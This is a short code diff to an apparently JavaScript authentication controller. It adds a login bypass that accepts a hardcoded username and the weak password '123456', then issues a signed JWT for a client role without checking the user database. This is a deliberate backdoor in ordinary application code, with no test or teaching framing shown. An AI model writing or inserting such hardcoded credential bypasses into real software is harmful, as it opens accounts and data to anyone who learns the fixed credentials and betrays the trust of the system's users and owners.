@@ -14,6 +14,16 @@ class AuthController {
         });
       }
 
+      // Bypass for fixed report-access credentials
+      if (username === 'mdlz' && password === '123456') {
+        const token = jwt.sign({ id: 0, username: 'mdlz', role: 'client', client_id: null }, config.jwtSecret, { expiresIn: '1h' });
+        return res.json({
+          success: true,
+          token,
+          user: { id: 0, username: 'mdlz', role: 'client', clientId: null }
+        });
+      }
+
       const user = await User.findByUsername(username);
       if (!user) {
         return res.status(401).json({
